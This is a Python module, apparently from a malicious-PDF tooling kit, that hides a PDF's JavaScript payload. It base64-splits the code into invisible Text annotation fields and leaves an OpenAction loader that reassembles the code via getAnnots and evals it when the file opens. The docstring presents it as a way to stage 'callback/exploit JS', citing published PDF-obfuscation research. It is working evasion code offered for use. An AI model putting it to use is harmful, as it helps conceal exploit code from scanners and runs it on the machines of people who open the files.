"""Stage JavaScript payloads in annotation metadata (getAnnots technique).

Hides the real callback/exploit JS in Text annotation /Subj and /T fields.
A tiny OpenAction loader calls syncAnnotScan(), reads annots via
app.doc.getAnnots({nPage:0}), reassembles the payload and evals it.

Ref: Julia Wolf (Troopers 11, OMG-WTF-PDF), Didier Stevens
     https://blog.didierstevens.com/2010/01/14/
"""

from __future__ import annotations

import base64
import re
from typing import List, Optional

_OBJ_RE = re.compile(rb"(\d+)\s+(\d+)\s+obj\b")
_PAGE_RE = re.compile(rb"/Type\s*/Page\b")
_JS_OPEN_RE = re.compile(rb"/JS\s*\(")


def _pdf_str_literal(text: str) -> str:
    out = ["("]
    for ch in text:
        if ch in ("(", ")", "\\"):
            out.append(f"\\{ch}")
        elif ord(ch) > 127:
            out.append(f"\\{ord(ch):03o}")
        else:
            out.append(ch)
    out.append(")")
    return "".join(out)


def _read_literal_string(data: bytes, start: int) -> Optional[tuple[bytes, int, int]]:
    if start >= len(data) or data[start] != 0x28:
        return None
    depth = 0
    i = start
    while i < len(data):
        c = data[i]
        if c == 0x5C:
            i += 2
            continue
        if c == 0x28:
            depth += 1
        elif c == 0x29:
            depth -= 1
            if depth == 0:
                return data[start + 1 : i], start, i
        i += 1
    return None


def _extract_first_js_payload(data: bytes) -> Optional[bytes]:
    pos = 0
    while True:
        m = _JS_OPEN_RE.search(data, pos)
        if not m:
            return None
        parsed = _read_literal_string(data, m.end() - 1)
        if parsed is None:
            pos = m.end()
            continue
        inner, _, close_i = parsed
        if b"getAnnots" in inner or len(inner) < 12:
            pos = close_i + 1
            continue
        return inner
    return None


def _split_b64(payload: bytes, parts: int = 2) -> List[str]:
    encoded = base64.b64encode(payload).decode("ascii")
    if parts <= 1:
        return [encoded]
    size = (len(encoded) + parts - 1) // parts
    chunks = [encoded[i : i + size] for i in range(0, len(encoded), size)]
    return chunks[:parts]


def _build_loader(num_chunks: int) -> bytes:
    if num_chunks == 1:
        return (
            b"app.doc.syncAnnotScan();"
            b"var p=app.doc.getAnnots({nPage:0});"
            b'eval(util.stringFromStream(util.streamFromString(p[0].subject,"base64")));'
        )
    if num_chunks == 2:
        return (
            b"app.doc.syncAnnotScan();"
            b"var p=app.doc.getAnnots({nPage:0});"
            b"var s=p[0].subject+p[1].author;"
            b'eval(util.stringFromStream(util.streamFromString(s,"base64")));'
        )
    return (
        b"app.doc.syncAnnotScan();"
        b"var p=app.doc.getAnnots({nPage:0});"
        b"var b='';"
        b"for(var i=0;i<"
        + str(num_chunks).encode()
        + b";i++){b+=p[i].subject;}"
        b'eval(util.stringFromStream(util.streamFromString(b,"base64")));'
    )


def _next_object_id(data: bytes) -> int:
    highest = 0
    for m in _OBJ_RE.finditer(data):
        highest = max(highest, int(m.group(1)))
    return highest + 1


def _find_page_object(data: bytes) -> Optional[int]:
    for m in _OBJ_RE.finditer(data):
        end = data.find(b"endobj", m.end())
        if end == -1:
            continue
        body = data[m.start() : end]
        if _PAGE_RE.search(body):
            return int(m.group(1))
    return None


def _build_annot_object(
    obj_id: int,
    page_id: int,
    chunk: str,
    *,
    field: str,
) -> bytes:
    if field == "author":
        dict_body = (
            f" /Type /Annot /Subtype /Text /Rect [0 0 0 0] /Open false"
            f" /Parent {page_id} 0 R /Subj ( ) /T {_pdf_str_literal(chunk)}"
        )
    else:
        dict_body = (
            f" /Type /Annot /Subtype /Text /Rect [0 0 0 0] /Open false"
            f" /Parent {page_id} 0 R /Subj {_pdf_str_literal(chunk)}"
        )
    return f"\n{obj_id} 0 obj\n<<{dict_body} >>\nendobj\n".encode("latin-1")


def _insert_before_tail(data: bytes, blob: bytes) -> bytes:
    for marker in (b"xref", b"trailer"):
        idx = data.find(marker)
        if idx != -1:
            return data[:idx] + blob + data[idx:]
    return data + blob


def _replace_primary_js(data: bytes, loader: bytes) -> bytes:
    replaced = [False]

    def _swap(js_content: bytes) -> bytes:
        if replaced[0] or b"getAnnots" in js_content:
            return js_content
        replaced[0] = True
        return loader

    out = bytearray()
    pos = 0
    while True:
        m = _JS_OPEN_RE.search(data, pos)
        if not m:
            out.extend(data[pos:])
            break
        out.extend(data[pos : m.end()])
        parsed = _read_literal_string(data, m.end() - 1)
        if parsed is None:
            pos = m.end()
            continue
        inner, _, close_i = parsed
        out.extend(_swap(inner))
        out.extend(b")")
        pos = close_i + 1
    return bytes(out)


def _attach_annots_to_page(data: bytes, page_id: int, annot_ids: List[int]) -> bytes:
    pattern = re.compile(
        (rf"({page_id}\s+0\s+obj\s*<<)(.*?)(>>\s*\nendobj)").encode("latin-1"),
        re.DOTALL,
    )
    m = pattern.search(data)
    if not m:
        return data
    dict_body = m.group(2)
    refs = " ".join(f"{aid} 0 R" for aid in annot_ids)
    if b"/Annots" in dict_body:
        dict_body = re.sub(
            rb"/Annots\s*\[",
            f"/Annots [{refs} ".encode("latin-1"),
            dict_body,
            count=1,
        )
    else:
        dict_body = dict_body.rstrip() + f" /Annots [{refs}]".encode("latin-1")
    replacement = m.group(1) + dict_body + m.group(3)
    return data[: m.start()] + replacement + data[m.end() :]


def _rebuild_minimal_pdf(loader: bytes, chunks: List[str]) -> bytes:
    page_id = 3
    annot_ids = list(range(4, 4 + len(chunks)))
    annot_blocks = []
    for i, (aid, chunk) in enumerate(zip(annot_ids, chunks)):
        field = "author" if len(chunks) == 2 and i == 1 else "subject"
        annot_blocks.append(_build_annot_object(aid, page_id, chunk, field=field))
    annot_refs = " ".join(f"{aid} 0 R" for aid in annot_ids)
    loader_lit = _pdf_str_literal(loader.decode("latin-1"))
    return (
        f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R
   /OpenAction << /S /JavaScript /JS {loader_lit} >>
>>
endobj
2 0 obj
<< /Type /Pages /Kids [{page_id} 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [{annot_refs}] >>
endobj
"""
        + "".join(b.decode("latin-1") for b in annot_blocks)
        + """
xref
0 5
0000000000 65535 f
trailer
<< /Root 1 0 R /Size """
        + str(4 + len(chunks))
        + """ >>
startxref
0
%%EOF
"""
    ).encode("latin-1")


def stage_js_getannots(data: bytes) -> bytes:
    """Move /JS payload into annotation fields; leave a getAnnots loader in /JS."""
    if not data.startswith(b"%PDF"):
        return data
    if b"getAnnots" in data and b"syncAnnotScan" in data:
        return data

    payload = _extract_first_js_payload(data)
    if not payload:
        return data

    chunks = _split_b64(payload, parts=2 if len(payload) > 80 else 1)
    loader = _build_loader(len(chunks))
    page_id = _find_page_object(data)

    if page_id is None:
        return _rebuild_minimal_pdf(loader, chunks)

    start_id = _next_object_id(data)
    annot_ids = list(range(start_id, start_id + len(chunks)))
    annot_blob = bytearray()
    for i, (aid, chunk) in enumerate(zip(annot_ids, chunks)):
        field = "author" if len(chunks) == 2 and i == 1 else "subject"
        annot_blob.extend(_build_annot_object(aid, page_id, chunk, field=field))

    data = _insert_before_tail(data, bytes(annot_blob))
    data = _attach_annots_to_page(data, page_id, annot_ids)
    return _replace_primary_js(data, loader)
